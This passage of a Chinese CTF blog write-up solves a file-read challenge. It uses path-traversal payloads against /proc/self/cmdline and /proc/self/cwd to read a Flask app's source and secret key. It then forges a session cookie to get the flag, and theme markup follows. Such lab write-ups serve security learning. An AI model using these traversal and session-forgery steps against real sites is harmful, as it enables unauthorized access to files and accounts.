+<li>/proc/[pid],当查看当前进程的时候可以用/proc/self代替，self是当前运行进程ID的符号链接</li>
+<li>cmdline — 启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息</li>
+<li>cwd — 指向当前进程运行目录的一个符号链接</li>
+<li>environ — 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示</li>
+</ul>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：article?name=../../../proc/self/cmdline</span><br></pre></td></tr></table></figure>
+
+<p>回显python server.py。</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/pythonserver.png" class title="pythonserver">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\pythonserver.png" alt="pythonserver"></p>
+<p>读取这个文件：因为不知道当前的路径，无法通过路径读取，所以通过当前进程的工作目录来读取。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：article?name=../../../proc/self/cwd/server.py</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/all.png" class title="all">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\all.png" alt="all"></p>
+<p>看到有两个文件<code>flag.py</code>和<code>key.py</code>。查看<code>key.py</code>的内容</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：article?name=../../../proc/self/cwd/key.py</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/key.png" class title="key">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\key.png" alt="key"></p>
+<p>得到key：Drmhze6EPcv0fN_81Bj-nA</p>
+<p>利用session加密脚本，以key为密钥，加密新构造的session，得到新的伪造出的session</p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/encode.png" class title="encode">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\encode.png" alt="encode"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.YFsCVw.rubo5Ztr2NoXcmWOAJRZ-STUXrY</span><br></pre></td></tr></table></figure>
+
+<p>通过burpsuit修改session，得到flag：<strong>n1book{afr_3_solved}</strong></p>
+<img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/afr3.png" class title="afr3">
+
+<p><img src="/2021/03/24/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-24/Blog\blog\source_posts\每日一题3-24\afr3.png" alt="afr3"></p>
+<p>（需要注意的是，抓的包应该是第一个页面，不是一直操作的第三个页面）</p>
+<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/102617154">https://blog.csdn.net/qq_43625917/article/details/102617154</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Youth____/article/details/111171019">https://blog.csdn.net/Youth____/article/details/111171019</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyaowangchuan/article/details/109784072">https://blog.csdn.net/wuyaowangchuan/article/details/109784072</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/23/IoT%E5%AD%A6%E4%B9%A0%E4%B9%8BCC2530%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="prev" title="IoT学习之CC2530连接树莓派">
+      <i class="fa fa-chevron-left"></i> IoT学习之CC2530连接树莓派
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/27/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%983-27/" rel="next" title="每日一题3-27">
+      每日一题3-27 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">1.</span> <span class="nav-text">任意文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E3%80%8A%E4%BB%8E0%E5%88%B01-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B"><span class="nav-number">1.1.</span> <span class="nav-text">《从0到1 CTFer成长之路》</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#afr1%E2%80%94%E2%80%94filter%E4%B8%BA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.2.</span> <span class="nav-text">afr1——filter为协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#afr2%E2%80%94%E2%80%94%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">1.3.</span> <span class="nav-text">afr2——目录穿越</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#afr3%E2%80%94%E2%80%94flask%E7%9A%84session%E4%BC%AA%E9%80%A0"><span class="nav-number">1.4.</span> <span class="nav-text">afr3——flask的session伪造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">1.5.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lyj789</p>
+  <div class="site-description" itemprop="description">快乐打工人</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyj789</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">94k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:25</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
